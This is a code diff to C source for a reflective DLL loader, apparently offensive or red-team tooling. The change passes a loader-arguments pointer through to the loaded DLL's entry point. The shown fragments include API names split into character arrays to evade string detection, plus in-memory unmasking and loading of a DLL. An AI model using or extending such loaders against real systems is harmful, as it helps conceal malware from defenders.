@@ -18,11 +18,11 @@
  */
 
 /* function prototypes */
-void ReflectiveLoader();
+void ReflectiveLoader(void * loaderArguments);
 
 /* this is the REAL entry point to this whole mess and it needs to go first! */
-__attribute__((noinline, no_reorder)) void go() {
-	ReflectiveLoader();
+__attribute__((noinline, no_reorder)) void go(void * loaderArguments) {
+	ReflectiveLoader(loaderArguments);
 }
 
 /*
@@ -69,8 +69,8 @@ void findNeededFunctions(WIN32FUNCS * funcs) {
 	char vp[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
 	funcs->VirtualProtect = (__typeof__(VirtualProtect) *) funcs->GetProcAddress(hModule, vp);
 
-	char fr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
-	funcs->VirtualFree = (__typeof__(VirtualFree) *) funcs->GetProcAddress(hModule, fr);
+	char vr[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0 };
+	funcs->VirtualFree = (__typeof__(VirtualFree) *) funcs->GetProcAddress(hModule, vr);
 }
 
 /*
@@ -124,7 +124,7 @@ char * unmaskAndLoad(WIN32FUNCS * funcs) {
 /*
  * Our reflective loader itself, have fun, go nuts!
  */
-void ReflectiveLoader() {
+void ReflectiveLoader(void * loaderArguments) {
 	char        * loaderStart;
 	char        * rawDll;
 	char        * loadedDll;
@@ -168,5 +168,5 @@ void ReflectiveLoader() {
 
 	/* call it */
 	entryPoint((HINSTANCE)loadedDll, DLL_PROCESS_ATTACH, &rdata);
-	entryPoint((HINSTANCE)loaderStart, 0x04, NULL);
+	entryPoint((HINSTANCE)loaderStart, 0x04, loaderArguments);
 }
